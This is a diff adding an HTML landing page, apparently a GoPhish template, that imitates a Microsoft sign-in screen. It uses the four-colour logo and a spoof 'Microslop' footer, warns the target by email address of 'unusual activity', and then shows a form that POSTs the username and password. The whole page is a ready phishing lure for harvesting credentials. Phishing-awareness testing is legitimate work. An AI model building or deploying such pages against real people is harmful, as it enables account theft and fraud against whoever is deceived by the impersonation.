@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in to your account</title>
+  
+  <!-- Favicon Surat Biru -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzAwNjdiOCI+PHBhdGggZD0iTTIwIDRINGMtMS4xIDAtMS45OS45LTEuOTkgMkwyIDE4YzAgMS4xLjkgMiAyIDJoMTZjMS4xIDAgMi0uOSAyLTJWNmMwLTEuMS0uOS0yLTItMnptMCA0bC04IDUtOC01VjZsOCA1IDgtNXYyeiIvPjwvc3ZnPg==">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f2f2f2; 
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    /* Kotak Dialog Putih */
+    .login-card {
+      background-color: #ffffff;
+      width: 100%;
+      max-width: 440px;
+      padding: 44px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+      border-radius: 0px; 
+      position: relative;
+      overflow: hidden; 
+    }
+
+    /* --- ANIMASI TRANSISI --- */
+    .screen {
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      width: 100%;
+    }
+    
+    .screen.hidden {
+      display: none;
+    }
+
+    .screen.fade-out {
+      opacity: 0;
+      transform: translateX(-20px);
+    }
+
+    .screen.fade-in {
+      opacity: 0;
+      transform: translateX(20px);
+    }
+
+    /* --- LOGO & TEKS --- */
+    .ms-logo {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 2px;
+      width: 22px;
+      height: 22px;
+      margin-bottom: 24px;
+    }
+    .ms-logo div { width: 100%; height: 100%; }
+    .ms-red { background-color: #f25022; }
+    .ms-green { background-color: #7fba00; }
+    .ms-blue { background-color: #00a4ef; }
+    .ms-yellow { background-color: #ffb900; }
+
+    h1 {
+      font-size: 1.5rem;
+      color: #1b1b1b;
+      font-weight: 600;
+      margin-bottom: 16px;
+      letter-spacing: -0.3px;
+    }
+
+    p {
+      font-size: 0.95rem;
+      color: #1b1b1b;
+      margin-bottom: 15px;
+      line-height: 1.5;
+    }
+
+    .email-highlight {
+      font-weight: 600;
+    }
+
+    /* --- FORM INPUT (Gaya Garis Bawah) --- */
+    .form-group {
+      margin-bottom: 20px;
+      margin-top: 25px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 8px 0;
+      border: none;
+      border-bottom: 1px solid #666;
+      background: transparent;
+      font-size: 1rem;
+      color: #1b1b1b;
+      outline: none;
+      transition: border-bottom-color 0.2s;
+    }
+
+    input::placeholder {
+      color: #666;
+    }
+
+    input:focus {
+      border-bottom: 2px solid #0067b8;
+      padding-bottom: 7px;
+    }
+
+    /* --- LINK BANTUAN --- */
+    .help-link {
+      color: #0067b8;
+      font-size: 0.85rem;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 5px;
+      margin-bottom: 20px;
+    }
+    .help-link:hover { text-decoration: underline; color: #004578; }
+
+    /* --- TOMBOL --- */
+    .btn-container {
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .btn-submit {
+      background-color: #0067b8;
+      color: white;
+      border: none;
+      padding: 8px 32px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-submit:hover {
+      background-color: #004578;
+    }
+
+    /* Disclaimer Etika */
+    .disclaimer {
+      font-size: 0.75rem;
+      color: #666;
+      text-align: center;
+      max-width: 400px;
+      margin-top: 15px;
+      line-height: 1.4;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-card">
+    
+    <form action="" method="POST" id="phish-form">
+      
+      <!-- ========================================== -->
+      <!-- SCREEN 1: PESAN PERINGATAN AWAL            -->
+      <!-- ========================================== -->
+      <div id="screen-1" class="screen">
+        <div class="ms-logo">
+          <div class="ms-red"></div>
+          <div class="ms-green"></div>
+          <div class="ms-blue"></div>
+          <div class="ms-yellow"></div>
+        </div>
+
+        <h1>Help us secure your account</h1>
+        
+        <!-- Di sini email akan muncul otomatis sesuai target GoPhish -->
+        <p>We have detected unusual activity on your OfficeMail account <span class="email-highlight">{{.Email}}</span>, or believe your credentials are at risk.</p>
+        
+        <p>For your security and to ensure only you have access to your account, we will ask you to verify your identity and change your password.</p>
+        
+        <div class="btn-container">
+          <button type="button" class="btn-submit" onclick="goToScreen2()">Next</button>
+        </div>
+      </div>
+
+      <!-- ========================================== -->
+      <!-- SCREEN 2: HALAMAN LOGIN                    -->
+      <!-- ========================================== -->
+      <div id="screen-2" class="screen hidden fade-in">
+        
+        <div class="ms-logo">
+          <div class="ms-red"></div>
+          <div class="ms-green"></div>
+          <div class="ms-blue"></div>
+          <div class="ms-yellow"></div>
+        </div>
+
+        <h1>Unusual sign-in activity</h1>
+        
+        <p>We've detected something unusual about this sign-in. For example, you might be signing in from a new location, device, or app. To keep your account secure, please verify your identity.</p>
+
+        <div class="form-group">
+          <!-- Value sudah dihapus, sehingga kolom email kosong dan harus diisi manual -->
+          <input type="email" name="username" placeholder="Email, phone, or Skype" required>
+        </div>
+        
+        <div class="form-group">
+          <input type="password" name="password" id="password-field" placeholder="Password" required>
+        </div>
+        
+        <a href="#" class="help-link">Forgot my password?</a>
+
+        <div class="btn-container">
+          <button type="submit" class="btn-submit">Next</button>
+        </div>
+      </div>
+
+    </form>
+  </div>
+
+  <div class="disclaimer">
+    © 2026 Microslop Corporation. All rights reserved.
+  </div>
+
+  <!-- JAVASCRIPT ANIMASI -->
+  <script>
+    function goToScreen2() {
+      const screen1 = document.getElementById('screen-1');
+      const screen2 = document.getElementById('screen-2');
+
+      // Animasi Screen 1 menghilang (slide ke kiri & pudar)
+      screen1.classList.add('fade-out');
+
+      setTimeout(() => {
+        screen1.classList.add('hidden');
+        screen1.classList.remove('fade-out');
+        
+        // Munculkan Screen 2
+        screen2.classList.remove('hidden');
+        
+        setTimeout(() => {
+          screen2.classList.remove('fade-in');
+          
+          // Karena email kosong, kita fokuskan kursor ke kolom email terlebih dahulu
+          const emailField = screen2.querySelector('input[type="email"]');
+          if(emailField) {
+              emailField.focus();
+          }
+        }, 50);
+
+      }, 400);
+    }
+  </script>
+
+</body>
+</html>
